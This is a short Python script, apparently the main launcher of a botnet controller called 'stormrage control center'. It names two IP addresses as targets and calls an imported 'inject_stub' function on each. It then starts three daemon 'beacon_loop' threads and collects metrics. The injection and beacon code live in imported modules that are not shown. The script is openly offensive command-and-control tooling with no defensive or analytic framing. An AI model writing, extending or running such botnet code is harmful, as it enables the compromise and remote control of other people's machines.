from src.botcore.beacon import beacon_loop
from src.botcore.injector import inject_stub
from src.metrics_collector import gather_metrics
import threading

print("[*] stormrage control center initialized")

targets = ["45.12.133.2", "88.44.101.3"]

for target in targets:
    inject_stub(target)

for i in range(3):
    threading.Thread(target=beacon_loop, args=(i,), daemon=True).start()

gather_metrics()
